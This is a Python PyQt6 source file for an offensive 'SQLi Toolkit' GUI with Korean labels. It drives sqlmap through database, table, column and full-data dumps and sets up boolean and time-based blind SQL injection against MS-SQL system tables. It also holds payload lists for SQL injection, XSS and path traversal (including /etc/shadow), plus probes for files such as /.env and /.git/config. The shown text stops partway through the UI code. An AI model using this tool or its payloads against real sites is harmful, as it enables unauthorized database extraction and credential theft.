#!/usr/bin/env python3
"""
SQLi Toolkit - PyQt6 Edition
by Michael
"""

import sys, os, re, subprocess, threading, urllib.parse
from datetime import datetime

import json
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QLabel, QPushButton, QLineEdit, QTextEdit, QCheckBox,
    QComboBox, QRadioButton, QButtonGroup, QFrame, QScrollArea,
    QSplitter, QTreeWidget, QTreeWidgetItem, QFileDialog, QMessageBox,
    QSizePolicy, QHeaderView, QProgressBar, QListWidget, QListWidgetItem,
    QDialog, QDialogButtonBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QObject
from PyQt6.QtGui import QFont, QColor, QPalette, QTextCursor, QKeySequence, QShortcut, QIcon

try:
    import requests
    from bs4 import BeautifulSoup
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


def resource_path(path):
    """Get resource path compatible with PyInstaller --onefile"""
    if getattr(sys, 'frozen', False):
        # Running as compiled by PyInstaller
        base_path = sys._MEIPASS
    else:
        # Running from source
        base_path = os.path.dirname(os.path.abspath(__file__))
    
    resource = os.path.join(base_path, path)
    if not os.path.exists(resource):
        # Fallback: also check in the current working directory
        resource = os.path.join(os.getcwd(), path)
    
    return resource

# ── 색상 ──────────────────────────────────────────────────
BG      = "#0d1117"
BG2     = "#161b22"
BG3     = "#21262d"
ACCENT  = "#00ff88"
ACCENT2 = "#ff6b35"
TEXT    = "#e6edf3"
TEXT_DIM= "#7d8590"
BORDER  = "#30363d"
RED     = "#ff4444"
YELLOW  = "#ffd700"
BLUE    = "#58a6ff"
PURPLE  = "#bc8cff"

# ── 페이로드 ──────────────────────────────────────────────
SQLI_ERRORS = [
    "sql","syntax","mysql","ora-","oracle","microsoft ole db","odbc",
    "jdbc","sqlite","postgresql","warning: pg_","column",
    "unclosed quotation","80040e14","mssql","sysobjects",
]
SQLI_PAYLOADS = [
    "'","''","' OR '1'='1'--","' OR 1=1--",
    "1' ORDER BY 1--","1' ORDER BY 99--",
    "' UNION SELECT NULL--","'; WAITFOR DELAY '0:0:3'--",
]
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
]
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd","..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow","%2e%2e%2fetc%2fpasswd",
]
TRAVERSAL_SIGNS = ["root:x:","daemon:","[extensions]","for 16-bit app support"]
INFO_PATHS = [
    "/robots.txt","/sitemap.xml","/.git/config",
    "/admin/","/admin/login","/phpinfo.php","/.env",
    "/web.config","/WEB-INF/web.xml",
]

# ── 스타일 ────────────────────────────────────────────────
STYLE = f"""
QWidget {{
    background-color: {BG};
    color: {TEXT};
    font-family: 'Courier New', monospace;
    font-size: 12px;
}}
QMainWindow {{ background-color: {BG}; }}
QTabWidget::pane {{
    border: 1px solid {BORDER};
    background-color: {BG2};
}}
QTabBar::tab {{
    background-color: {BG3};
    color: {TEXT_DIM};
    padding: 8px 20px;
    border: none;
    font-weight: bold;
    font-size: 12px;
}}
QTabBar::tab:selected {{
    background-color: {ACCENT};
    color: {BG};
}}
QTabBar::tab:hover:!selected {{
    background-color: {BG2};
    color: {TEXT};
}}
QLineEdit {{
    background-color: {BG3};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    padding: 6px 8px;
    font-size: 12px;
    selection-background-color: {ACCENT};
    selection-color: {BG};
}}
QLineEdit:focus {{ border: 1px solid {ACCENT}; }}
QTextEdit {{
    background-color: {BG};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    font-size: 12px;
    selection-background-color: {ACCENT};
    selection-color: {BG};
}}
QTextEdit:focus {{ border: 1px solid {ACCENT}; }}
QPushButton {{
    background-color: {BG3};
    color: {TEXT};
    border: none;
    border-radius: 4px;
    padding: 8px 16px;
    font-weight: bold;
    font-size: 12px;
}}
QPushButton:hover {{ background-color: {BG2}; }}
QPushButton:pressed {{ background-color: {BG}; }}
QPushButton:disabled {{ color: {TEXT_DIM}; background-color: {BG3}; }}
QCheckBox {{
    color: {TEXT};
    spacing: 8px;
    font-size: 12px;
}}
QCheckBox::indicator {{
    width: 16px; height: 16px;
    border: 1px solid {BORDER};
    border-radius: 3px;
    background-color: {BG3};
}}
QCheckBox::indicator:checked {{
    background-color: {ACCENT};
    border-color: {ACCENT};
}}
QRadioButton {{
    color: {TEXT};
    spacing: 8px;
    font-size: 12px;
}}
QRadioButton::indicator {{
    width: 14px; height: 14px;
    border: 1px solid {BORDER};
    border-radius: 7px;
    background-color: {BG3};
}}
QRadioButton::indicator:checked {{
    background-color: {ACCENT};
    border-color: {ACCENT};
}}
QComboBox {{
    background-color: {BG3};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    padding: 5px 8px;
    font-size: 12px;
}}
QComboBox:focus {{ border: 1px solid {ACCENT}; }}
QComboBox::drop-down {{ border: none; width: 20px; }}
QComboBox QAbstractItemView {{
    background-color: {BG3};
    color: {TEXT};
    border: 1px solid {BORDER};
    selection-background-color: {ACCENT};
    selection-color: {BG};
}}
QScrollBar:vertical {{
    background: {BG3};
    width: 8px;
    border-radius: 4px;
}}
QScrollBar::handle:vertical {{
    background: {BORDER};
    border-radius: 4px;
    min-height: 20px;
}}
QScrollBar::handle:vertical:hover {{ background: {TEXT_DIM}; }}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0px; }}
QScrollBar:horizontal {{
    background: {BG3};
    height: 8px;
    border-radius: 4px;
}}
QScrollBar::handle:horizontal {{
    background: {BORDER};
    border-radius: 4px;
}}
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {{ width: 0px; }}
QSplitter::handle {{ background: {BORDER}; width: 1px; height: 1px; }}
QTreeWidget {{
    background-color: {BG};
    color: {TEXT};
    border: 1px solid {BORDER};
    border-radius: 4px;
    alternate-background-color: {BG3};
    font-size: 12px;
}}
QTreeWidget::item:selected {{
    background-color: {BG3};
    color: {ACCENT};
}}
QHeaderView::section {{
    background-color: {BG3};
    color: {ACCENT};
    border: none;
    padding: 6px;
    font-weight: bold;
}}
QFrame[frameShape="4"], QFrame[frameShape="5"] {{
    color: {BORDER};
}}
QLabel {{ background: transparent; }}
QScrollArea {{ border: none; background: transparent; }}
"""

def btn(text, color=ACCENT, text_color=BG, w=None, h=36):
    b = QPushButton(text)
    b.setStyleSheet(f"""
        QPushButton {{
            background-color: {color};
            color: {text_color};
            border: none; border-radius: 4px;
            padding: 8px 16px;
            font-weight: bold; font-size: 12px;
        }}
        QPushButton:hover {{ background-color: {color}dd; }}
        QPushButton:pressed {{ background-color: {color}99; }}
        QPushButton:disabled {{ background-color: {BG3}; color: {TEXT_DIM}; }}
    """)
    if w: b.setFixedWidth(w)
    if h: b.setFixedHeight(h)
    return b

def section_label(text, color=ACCENT):
    lbl = QLabel(text)
    lbl.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 13px; padding: 2px 0;")
    return lbl

def dim_label(text):
    lbl = QLabel(text)
    lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px;")
    return lbl

def sep():
    f = QFrame()
    f.setFrameShape(QFrame.Shape.HLine)
    f.setStyleSheet(f"color: {BORDER};")
    return f


# ── Worker 스레드 ─────────────────────────────────────────
class Worker(QObject):
    log     = pyqtSignal(str, str)   # text, tag
    done    = pyqtSignal(int)        # return code
    dbs     = pyqtSignal(list)
    tables  = pyqtSignal(list)
    cols    = pyqtSignal(list)
    dump    = pyqtSignal(str)

    def __init__(self, cmd, parse):
        super().__init__()
        self.cmd   = cmd
        self.parse = parse
        self._proc = None

    def run(self):
        lines = []
        try:
            self._proc = subprocess.Popen(
                self.cmd, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in self._proc.stdout:
                lines.append(line)
                self.log.emit(line, self._get_tag(line))
            self._proc.wait()
            rc = self._proc.returncode
        except FileNotFoundError:
            self.log.emit("\n[오류] sqlmap을 찾을 수 없어\npip install sqlmap\n", "error")
            rc = -1
        except Exception as e:
            self.log.emit(f"\n[예외] {e}\n", "error"); rc = -1

        full = "".join(lines)
        if   self.parse == "dbs":    self.dbs.emit(re.findall(r'\[\*\]\s+(\S+)', full) or re.findall(r'retrieved:\s+(\S+)', full))
        elif self.parse == "tables": self.tables.emit(re.findall(r'\|\s+(\w+)\s+\|', full) or re.findall(r'retrieved:\s+(\S+)', full))
        elif self.parse == "cols":   self.cols.emit(re.findall(r'\|\s+(\w+)\s+\|', full))
        elif self.parse == "dump":   self.dump.emit(full)
        self.done.emit(rc)

    def _get_tag(self, line):
        l = line.lower()
        if "[error]" in l or "[critical]" in l: return "error"
        if "[warning]" in l:  return "warn"
        if "retrieved:" in l or line.strip().startswith("[*]"): return "found"
        if "[info]" in l:     return "info"
        if line.strip().startswith("|"): return "info"
        return "dim"

    def stop(self):
        if self._proc: self._proc.terminate()


# ── 메인 윈도우 ───────────────────────────────────────────
class SQLiToolkit(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("⚡ SQLi Toolkit  //  by Michael")
        
        # Set window icon with error handling
        try:
            icon_path = resource_path("icon.ico")
            if os.path.exists(icon_path):
                self.setWindowIcon(QIcon(icon_path))
        except Exception as e:
            pass  # Icon loading failed, continue without icon
        
        self.resize(1300, 880)

        self._worker     = None
        self._thread     = None
        self._blind_stop = False
        self._scan_stop  = False
        self._dump_cols  = []
        self._dump_rows  = []
        self.scan_results = []
        self.detected_params = []
        self.sqlmap_bin  = self._find_sqlmap()

        self._build_ui()

    def _save_options(self):
        """현재 설정 JSON으로 저장"""
        data = {
            "url":        self.url_entry.text(),
            "mode":       self.mode_grp.checkedId(),
            "post_data":  self.post_entry.text(),
            "db":         self.db_entry.text(),
            "table":      self.tbl_entry.text(),
            "extra":      self.extra_entry.text(),
            "sqlmap_bin": self.bin_entry.text(),
            "options":    {flag: cb.isChecked() for flag, cb in self.opt_vars.items()},
        }
        path, _ = QFileDialog.getSaveFileName(
            self, "옵션 저장",
            f"sqli_options_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON (*.json);;All (*.*)")
        if path:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            QMessageBox.information(self, "저장 완료", f"저장됨:\n{path}")

    def _load_options(self):
        """JSON에서 설정 불러오기"""
        path, _ = QFileDialog.getOpenFileName(
            self, "옵션 불러오기", "", "JSON (*.json);;All (*.*)")
        if not path: return
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            self.url_entry.setText(data.get("url", ""))
            self.post_entry.setText(data.get("post_data", ""))
            self.db_entry.setText(data.get("db", ""))
            self.tbl_entry.setText(data.get("table", ""))
            self.extra_entry.setText(data.get("extra", ""))
            self.bin_entry.setText(data.get("sqlmap_bin", self.sqlmap_bin))
            # 모드
            mode = data.get("mode", 0)
            btn = self.mode_grp.button(mode)
            if btn: btn.setChecked(True); self._on_mode_change()
            # 옵션 체크박스
            for flag, val in data.get("options", {}).items():
                if flag in self.opt_vars:
                    self.opt_vars[flag].setChecked(val)
            QMessageBox.information(self, "불러오기 완료", "설정이 적용됐어!")
        except Exception as e:
            QMessageBox.critical(self, "오류", f"불러오기 실패:\n{e}")

    def _find_sqlmap(self):
        for c in ["sqlmap", "/opt/homebrew/bin/sqlmap", "/usr/local/bin/sqlmap"]:
            try:
                r = subprocess.run([c,"--version"], capture_output=True, text=True, timeout=3)
                if r.returncode == 0: return c
            except Exception: pass
        return "sqlmap"

    def _build_ui(self):
        # 헤더
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        hdr = QWidget()
        hdr.setFixedHeight(52)
        hdr.setStyleSheet(f"background-color: {BG2}; border-bottom: 1px solid {BORDER};")
        hl = QHBoxLayout(hdr)
        hl.setContentsMargins(20, 0, 20, 0)
        title = QLabel("⚡  SQLi Toolkit")
        title.setStyleSheet(f"color: {ACCENT}; font-size: 20px; font-weight: bold;")
        sub = QLabel("sqlmap  |  Blind SQLi  |  취약점 스캐너")
        sub.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px;")
        self.status_lbl = QLabel("● IDLE")
        self.status_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 12px;")
        hl.addWidget(title)
        hl.addSpacing(12)
        hl.addWidget(sub)
        hl.addStretch()
        hl.addWidget(self.status_lbl)
        root.addWidget(hdr)

        # 메인 탭
        self.main_tab = QTabWidget()
        root.addWidget(self.main_tab)

        sqlmap_w = QWidget()
        scanner_w = QWidget()
        self.main_tab.addTab(sqlmap_w, "⚡  sqlmap")
        self.main_tab.addTab(scanner_w, "🔍  취약점 스캐너")

        self._build_sqlmap_tab(sqlmap_w)
        self._build_scanner_tab(scanner_w)

    # ══════════════════════════════════════════════════════
    #  sqlmap 탭
    # ══════════════════════════════════════════════════════
    def _build_sqlmap_tab(self, parent):
        layout = QHBoxLayout(parent)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(6)

        # 왼쪽 탭
        self.left_tab = QTabWidget()
        self.left_tab.setFixedWidth(390)
        layout.addWidget(self.left_tab)

        sqlmap_left = QWidget()
        blind_left  = QWidget()
        self.left_tab.addTab(sqlmap_left, "⚡  sqlmap")
        self.left_tab.addTab(blind_left,  "🕵  Blind SQLi")

        self._build_sqlmap_left(sqlmap_left)
        self._build_blind_left(blind_left)

        # 오른쪽
        right = QWidget()
        layout.addWidget(right, 1)
        self._build_sqlmap_right(right)

    def _build_sqlmap_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12, 8, 12, 8)
        lay.setSpacing(4)
        scroll.setWidget(inner)

        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.addWidget(scroll)

        # TARGET
        lay.addWidget(section_label("[ TARGET ]"))
        lay.addWidget(sep())

        # 모드
        mode_w = QWidget()
        mode_l = QHBoxLayout(mode_w)
        mode_l.setContentsMargins(0,0,0,0)
        self.mode_grp = QButtonGroup(self)
        self.rb_url  = QRadioButton("URL");  self.rb_url.setChecked(True)
        self.rb_post = QRadioButton("POST")
        self.rb_file = QRadioButton("파일(-r)")
        for i, rb in enumerate([self.rb_url, self.rb_post, self.rb_file]):
            self.mode_grp.addButton(rb, i)
            mode_l.addWidget(rb)
        mode_l.addStretch()
        lay.addWidget(mode_w)
        self.mode_grp.buttonClicked.connect(self._on_mode_change)

        lay.addWidget(dim_label("URL 또는 파일 경로"))
        self.url_entry = QLineEdit()
        self.url_entry.setPlaceholderText("http://192.168.x.x/page?id=1")
        lay.addWidget(self.url_entry)

        self.detect_btn = btn("🔎  파라미터 자동 탐지", PURPLE, "white")
        self.detect_btn.clicked.connect(self._auto_detect)
        lay.addWidget(self.detect_btn)

        lay.addWidget(dim_label("탐지된 파라미터"))
        self.param_combo = QComboBox()
        self.param_combo.currentIndexChanged.connect(self._on_param_select)
        lay.addWidget(self.param_combo)

        self.file_btn = btn("📂  요청파일 선택", BG3, TEXT_DIM)
        self.file_btn.clicked.connect(self._pick_file)
        self.file_btn.hide()
        lay.addWidget(self.file_btn)

        self.post_widget = QWidget()
        pl = QVBoxLayout(self.post_widget)
        pl.setContentsMargins(0,0,0,0)
        pl.addWidget(dim_label("POST 데이터"))
        self.post_entry = QLineEdit()
        self.post_entry.setPlaceholderText("user=test&pass=test")
        pl.addWidget(self.post_entry)
        self.post_widget.hide()
        lay.addWidget(self.post_widget)

        # 단계별
        lay.addSpacing(8)
        lay.addWidget(section_label("[ 단계별 실행 ]", BLUE))
        lay.addWidget(sep())

        self._add_step(lay, "STEP 1", "DB 목록 추출", BLUE,
                       "▶  DB 목록 조회  (--dbs)", self._run_dbs)
        self._add_step(lay, "STEP 2", "테이블 목록 추출", ACCENT,
                       "▶  테이블 조회  (--tables)", self._run_tables, has_db=True)
        self._add_step(lay, "STEP 3", "컬럼 목록 추출", YELLOW,
                       "▶  컬럼 조회  (--columns)", self._run_columns, has_tbl=True)

        # 컬럼 선택 박스
        col_box = QFrame()
        col_box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        col_lay = QVBoxLayout(col_box)
        col_lay.setContentsMargins(10,8,10,10)
        col_lay.setSpacing(4)
        col_hdr = QHBoxLayout()
        col_title = QLabel("덤프할 컬럼 선택  (비우면 전체)")
        col_title.setStyleSheet(f"color: {YELLOW}; font-weight: bold; font-size: 11px; border: none;")
        col_hdr.addWidget(col_title)
        sel_all_btn = QPushButton("전체")
        sel_all_btn.setFixedSize(50, 22)
        sel_all_btn.setStyleSheet(f"background:{BG2}; color:{TEXT_DIM}; border:none; border-radius:3px; font-size:10px;")
        sel_none_btn = QPushButton("해제")
        sel_none_btn.setFixedSize(50, 22)
        sel_none_btn.setStyleSheet(f"background:{BG2}; color:{TEXT_DIM}; border:none; border-radius:3px; font-size:10px;")
        col_hdr.addStretch()
        col_hdr.addWidget(sel_all_btn)
        col_hdr.addWidget(sel_none_btn)
        col_lay.addLayout(col_hdr)

        self.col_list = QListWidget()
        self.col_list.setFixedHeight(120)
        self.col_list.setSelectionMode(QListWidget.SelectionMode.MultiSelection)
        self.col_list.setStyleSheet(f"""
            QListWidget {{
                background: {BG}; color: {TEXT};
                border: 1px solid {BORDER}; border-radius: 4px;
                font-size: 11px;
            }}
            QListWidget::item {{ padding: 3px 6px; }}
            QListWidget::item:selected {{
                background: {ACCENT}; color: {BG};
            }}
        """)
        col_lay.addWidget(self.col_list)
        self.col_selected_lbl = QLabel("← STEP 3 완료 후 자동 반영")
        self.col_selected_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; border: none;")
        col_lay.addWidget(self.col_selected_lbl)

        sel_all_btn.clicked.connect(self.col_list.selectAll)
        sel_none_btn.clicked.connect(self.col_list.clearSelection)
        lay.addWidget(col_box)

        self._add_step(lay, "STEP 4", "데이터 덤프", ACCENT2,
                       "▶  데이터 덤프  (--dump)", self._run_dump,
                       note="선택된 컬럼만 덤프 (비우면 전체)")

        # 옵션
        lay.addSpacing(8)
        lay.addWidget(section_label("[ 옵션 ]"))
        lay.addWidget(sep())

        self.opt_vars = {}
        for flag, desc, default in [
            ("--batch","자동 Yes",True),
            ("--random-agent","랜덤 UA",False),
            ("--level=3","레벨 3",False),
            ("--risk=2","리스크 2",False),
            ("--threads=5","스레드 5",False),
        ]:
            cb = QCheckBox(f"{flag}  ─  {desc}")
            cb.setChecked(default)
            self.opt_vars[flag] = cb
            lay.addWidget(cb)

        lay.addSpacing(4)
        lay.addWidget(dim_label("쿠키 / 추가 플래그"))
        self.extra_entry = QLineEdit()
        self.extra_entry.setPlaceholderText('--cookie="PHPSESSID=xxx"')
        lay.addWidget(self.extra_entry)

        lay.addWidget(dim_label("sqlmap 경로"))
        self.bin_entry = QLineEdit(self.sqlmap_bin)
        lay.addWidget(self.bin_entry)

        # 옵션 저장/불러오기
        save_load_w = QWidget()
        sl_lay = QHBoxLayout(save_load_w)
        sl_lay.setContentsMargins(0,0,0,0)
        save_opt_btn = btn("💾  옵션 저장", BG3, ACCENT, h=32)
        load_opt_btn = btn("📂  옵션 불러오기", BG3, BLUE, h=32)
        save_opt_btn.clicked.connect(self._save_options)
        load_opt_btn.clicked.connect(self._load_options)
        sl_lay.addWidget(save_opt_btn)
        sl_lay.addWidget(load_opt_btn)
        lay.addWidget(save_load_w)

        lay.addSpacing(8)
        lay.addWidget(sep())
        self.stop_btn = btn("■  중지", RED, "white")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self._stop)
        lay.addWidget(self.stop_btn)
        lay.addStretch()

    def _add_step(self, lay, step, desc, color, btn_txt, cmd,
                  has_db=False, has_tbl=False, note=""):
        box = QFrame()
        box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        bl = QVBoxLayout(box)
        bl.setContentsMargins(10, 8, 10, 10)
        bl.setSpacing(4)

        lbl = QLabel(f"{step}  {desc}")
        lbl.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 12px; border: none;")
        bl.addWidget(lbl)

        if has_db:
            bl.addWidget(dim_label("DB 이름"))
            self.db_entry = QLineEdit()
            bl.addWidget(self.db_entry)
            self.db_combo = QComboBox()
            self.db_combo.currentTextChanged.connect(lambda v: self.db_entry.setText(v) if v else None)
            bl.addWidget(self.db_combo)
            bl.addWidget(dim_label("← STEP 1 완료 후 자동 반영"))

        if has_tbl:
            bl.addWidget(dim_label("테이블 이름"))
            self.tbl_entry = QLineEdit()
            bl.addWidget(self.tbl_entry)
            self.tbl_combo = QComboBox()
            self.tbl_combo.currentTextChanged.connect(lambda v: self.tbl_entry.setText(v) if v else None)
            bl.addWidget(self.tbl_combo)
            bl.addWidget(dim_label("← STEP 2 완료 후 자동 반영"))

        if note:
            bl.addWidget(dim_label(note))

        b = btn(btn_txt, color, "white" if color in (ACCENT2, RED, PURPLE, BLUE) else BG)
        b.clicked.connect(cmd)
        bl.addWidget(b)
        lay.addWidget(box)

    def _build_blind_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12, 8, 12, 8)
        lay.setSpacing(6)
        scroll.setWidget(inner)
        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0,0,0,0)
        outer.addWidget(scroll)

        # URL 박스
        url_box = QFrame()
        url_box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        ul = QVBoxLayout(url_box)
        ul.setContentsMargins(10,8,10,10)
        lbl = QLabel("🎯  대상 URL")
        lbl.setStyleSheet(f"color: {ACCENT}; font-weight: bold; font-size: 13px; border: none;")
        ul.addWidget(lbl)
        ul.addWidget(dim_label("파라미터 포함  예) http://x.x.x.x/page?keyword=1"))
        self.blind_url_entry = QLineEdit()
        self.blind_url_entry.setPlaceholderText("http://192.168.x.x/page?param=1")
        ul.addWidget(self.blind_url_entry)
        lay.addWidget(url_box)

        lay.addWidget(dim_label("  sysobjects → syscolumns → 데이터  순서로 진행"))

        # Blind 1
        b1 = self._blind_box(lay, "① 테이블명 추출", PURPLE, "sysobjects  (xtype=U)")
        row = QHBoxLayout()
        row.addWidget(dim_label("최대글자수"))
        self.btbl_maxlen = QLineEdit("20"); self.btbl_maxlen.setFixedWidth(50)
        row.addWidget(self.btbl_maxlen)
        row.addSpacing(12)
        row.addWidget(dim_label("인덱스"))
        self.btbl_idx = QLineEdit("0"); self.btbl_idx.setFixedWidth(40)
        row.addWidget(self.btbl_idx)
        row.addStretch()
        b1.addLayout(row)
        b1.addWidget(dim_label("  0=첫번째, 1=두번째 테이블..."))
        self.btbl_progress = QLabel(""); self.btbl_progress.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.btbl_result   = QLabel("결과: "); self.btbl_result.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b1.addWidget(self.btbl_progress); b1.addWidget(self.btbl_result)
        b = btn("▶  테이블명 추출", PURPLE, "white"); b.clicked.connect(self._run_blind_table)
        b1.addWidget(b)

        # Blind 2
        b2 = self._blind_box(lay, "② 컬럼명 추출", BLUE, "syscolumns")
        b2.addWidget(dim_label("테이블"))
        self.bcol_tbl = QLineEdit(); b2.addWidget(self.bcol_tbl)
        row2 = QHBoxLayout()
        row2.addWidget(dim_label("최대글자수"))
        self.bcol_maxlen = QLineEdit("20"); self.bcol_maxlen.setFixedWidth(50); row2.addWidget(self.bcol_maxlen)
        row2.addSpacing(12)
        row2.addWidget(dim_label("컬럼인덱스"))
        self.bcol_idx = QLineEdit("0"); self.bcol_idx.setFixedWidth(40); row2.addWidget(self.bcol_idx)
        row2.addStretch(); b2.addLayout(row2)
        b2.addWidget(dim_label("  ① 결과를 테이블에 입력"))
        self.bcol_progress = QLabel(""); self.bcol_progress.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.bcol_result   = QLabel("결과: "); self.bcol_result.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b2.addWidget(self.bcol_progress); b2.addWidget(self.bcol_result)
        b = btn("▶  컬럼명 추출", BLUE, "white"); b.clicked.connect(self._run_blind_col)
        b2.addWidget(b)

        # Blind 3
        b3 = self._blind_box(lay, "③ Boolean 데이터 추출", ACCENT, "참/거짓 응답 차이로 추출")
        for lbl_txt, attr in [("테이블","blind_tbl_entry"),("컬럼","blind_col_entry"),("조건","blind_where_entry")]:
            b3.addWidget(dim_label(lbl_txt))
            e = QLineEdit()
            if lbl_txt == "조건": e.setPlaceholderText("예) adminid='admin'  (비워두면 TOP 1)")
            b3.addWidget(e); setattr(self, attr, e)
        row3 = QHBoxLayout()
        row3.addWidget(dim_label("최대글자수"))
        self.blind_maxlen_entry = QLineEdit("20"); self.blind_maxlen_entry.setFixedWidth(50); row3.addWidget(self.blind_maxlen_entry)
        row3.addStretch(); b3.addLayout(row3)
        self.bool_progress_lbl = QLabel(""); self.bool_progress_lbl.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.bool_result_lbl   = QLabel("결과: "); self.bool_result_lbl.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b3.addWidget(self.bool_progress_lbl); b3.addWidget(self.bool_result_lbl)
        b = btn("▶  Boolean Blind 추출", ACCENT, BG); b.clicked.connect(self._run_boolean_blind)
        b3.addWidget(b)

        # Blind 4
        b4 = self._blind_box(lay, "④ Time-based 데이터 추출", ACCENT2, "WAITFOR DELAY  (MS-SQL)")
        for lbl_txt, attr in [("테이블","time_tbl_entry"),("컬럼","time_col_entry"),("조건","time_where_entry")]:
            b4.addWidget(dim_label(lbl_txt))
            e = QLineEdit(); b4.addWidget(e); setattr(self, attr, e)
        row4 = QHBoxLayout()
        row4.addWidget(dim_label("딜레이(초)"))
        self.time_delay_entry = QLineEdit("2"); self.time_delay_entry.setFixedWidth(40); row4.addWidget(self.time_delay_entry)
        row4.addSpacing(12)
        row4.addWidget(dim_label("최대글자수"))
        self.time_maxlen_entry = QLineEdit("20"); self.time_maxlen_entry.setFixedWidth(50); row4.addWidget(self.time_maxlen_entry)
        row4.addStretch(); b4.addLayout(row4)
        self.time_progress_lbl = QLabel(""); self.time_progress_lbl.setStyleSheet(f"color: {ACCENT}; font-size: 11px; border: none;")
        self.time_result_lbl   = QLabel("결과: "); self.time_result_lbl.setStyleSheet(f"color: {YELLOW}; font-weight: bold; border: none;")
        b4.addWidget(self.time_progress_lbl); b4.addWidget(self.time_result_lbl)
        b = btn("▶  Time-based Blind 추출", ACCENT2, "white"); b.clicked.connect(self._run_time_blind)
        b4.addWidget(b)

        lay.addSpacing(8)
        lay.addWidget(sep())
        b_stop = btn("■  Blind 중지", RED, "white")
        b_stop.clicked.connect(self._stop)
        lay.addWidget(b_stop)
        lay.addStretch()

    def _blind_box(self, parent_lay, title, color, desc):
        box = QFrame()
        box.setStyleSheet(f"QFrame {{ background-color: {BG3}; border-radius: 6px; border: 1px solid {BORDER}; }}")
        bl = QVBoxLayout(box)
        bl.setContentsMargins(10,8,10,10); bl.setSpacing(4)
        lbl = QLabel(title)
        lbl.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 12px; border: none;")
        bl.addWidget(lbl)
        bl.addWidget(dim_label(desc))
        parent_lay.addWidget(box)
        return bl

    def _build_sqlmap_right(self, parent):
        lay = QVBoxLayout(parent)
        lay.setContentsMargins(0,0,0,0)

        self.out_tab = QTabWidget()
        lay.addWidget(self.out_tab)

        # 로그 탭
        log_w = QWidget()
        log_l = QVBoxLayout(log_w)
        log_l.setContentsMargins(4,4,4,4)
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setFont(QFont("Courier New", 11))
        log_l.addWidget(self.output)

        bot = QWidget()
        bot.setFixedHeight(32)
        bot.setStyleSheet(f"background-color: {BG3};")
        bl2 = QHBoxLayout(bot)
        bl2.setContentsMargins(8,2,8,2)
        self.time_lbl = QLabel("")
        self.time_lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px;")
        clear_btn = btn("클리어", BG3, TEXT_DIM, w=70, h=24)
        clear_btn.clicked.connect(self._clear)
        save_btn  = btn("저장",   BG3, TEXT_DIM, w=60, h=24)
        save_btn.clicked.connect(self._save)
        bl2.addWidget(clear_btn); bl2.addWidget(save_btn)
        bl2.addStretch(); bl2.addWidget(self.time_lbl)
        log_l.addWidget(bot)
        self.out_tab.addTab(log_w, "📋  로그")

        # 데이터 뷰 탭
        data_w = QWidget()
        dl = QVBoxLayout(data_w)
        dl.setContentsMargins(4,4,4,4)

        dtb = QWidget()
        dtb.setFixedHeight(34)
        dtb.setStyleSheet(f"background-color: {BG3};")
        dtbl = QHBoxLayout(dtb)
        dtbl.setContentsMargins(10,4,10,4)
        self._row_count_lbl = QLabel("덤프 결과")
        self._row_count_lbl.setStyleSheet(f"color: {ACCENT}; font-weight: bold; border: none;")
        csv_btn = btn("CSV 저장", BG3, ACCENT, w=90, h=26)
        csv_btn.clicked.connect(self._save_csv)
        dtbl.addWidget(self._row_count_lbl); dtbl.addStretch(); dtbl.addWidget(csv_btn)
        dl.addWidget(dtb)

        self._data_tree = QTreeWidget()
